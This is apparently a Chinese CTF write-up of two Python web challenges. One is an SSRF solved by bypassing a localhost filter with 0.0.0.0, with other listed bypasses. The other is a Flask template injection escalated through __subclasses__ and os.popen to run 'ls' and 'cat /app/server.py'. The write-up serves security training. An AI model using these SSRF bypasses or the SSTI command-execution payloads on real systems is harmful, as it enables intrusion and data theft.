# Python中的安全问题CTF

## **1.Python里的SSRF**

题目提示

尝试访问到容器内部的 8000 端口和 url path /api/internal/secret 即可获取 flag

访问url：

http://f5704bb3-5869-4ecb-9bdc-58b022589224.node3.buuoj.cn/

回显如下：

![](../Images/351bf48fa10cfa1fcd1fb9d6041ecd15.png)

通过提示构造payload：

?url=http://127.0.0.1:8000/api/internal/secret

进行访问

![](../Images/b25e4b7c33d6bbe0af2758ce538c775e.png)

回显提示127.0.0.1是禁止的因为127.0.0.1是本地的地址，提示是说访问容器内部的地址

所以我们可以用0.0.0.0代替127.0.0.1

重新构造payload：

?url=http://0.0.0.0:8000/api/internal/secret

成功得到flag

![](../Images/1a22b2c97c074fda29785e5bad9f0b21.png)

其他不同的方式，得多尝试一下，

官方wp

本题有多重解法

```
\- \`0.0.0.0:8000\` 绕过
\- \`\[::1\]:8000\` 绕过（需要支持 ipv6)
\- 重定向跳转到 \`127.0.0.1:8000\`
\- dns rebinding 输入一个域名，第一次解析到非 \`127.0.0.1\` 地址上，第二个解析到 \`127.0.0.1\` 上。
```

## **2.python模板注入(SSTI)**

访问url，页面回显 password is wrong，但是没有输入密码的地方

![](../Images/43a96556756c4c8840f53d69b6555b65.png)

所以从 url 提交

?password={{3\*3}}

发现可以识别并且正确回显

![](../Images/f278ad12ce50c7c05381ccad982c46a9.png)

据回显的结果可以判断这是一个flask模板注入

参考

flask之ssti模版注入从零到入门

通过以下语句

```
/?password={{"".\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_()}}
```

拿到可用的类的列表

![](../Images/ef7b8427edb7d1f278362f6c66412bc1.png)

我们需要的是os命令执行类<class 'os.\_wrap\_close'>

![](../Images/8420988f44c379b2864b2a25a2cbf662.png)

我们要判断他所属的位置，这样才能进行索引,将全部类复制放到pycharm(与他有同样功能的工具也行),我们索引逗号的位置，我们索引到我们需要类的位置,再在索引他前面逗号的位置，我这里索引的结果是127,如果不对上下浮动几位看一下，大概就这个位置，我这127是正确的，

![](../Images/4310c797f1c23ecd07a33d17394bda86.png)

我们可以先看一下我们索引的是否正确,输入url

```
/?password={{"".\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_()\[127\]}}
```

我这里索引的结果是127,如果不对上下浮动几位看一下，大概就这个位置，我这127是正确的,所以索引结果就是<class 'os.\_wrap\_close'>

![](../Images/99f7721c48816704b830511c1c78966e.png)

构造语句,并执行ls命令(对方是Linux服务器,所以要使用Linux命令)

```
/?password={{"".\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_()\[127\].\_\_init\_\_.\_\_globals\_\_\['popen'\]('ls').read()}}
```

文件夹如下

![](../Images/984214832ae319599650603a491a6726.png)

最引起我们注意的就是app这个文件夹

经过一些尝试(目录遍历什么的)，我们得知flag就在/app/server.py中,我们直接用cat查看文件内容就行

```
/?password={{"".\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_()\[127\].\_\_init\_\_.\_\_globals\_\_\['popen'\]('cat /app/server.py').read()}}
```

成功获取flag

![](../Images/dce750ddc0b9c8afcd951c259e5d7fa6.png)
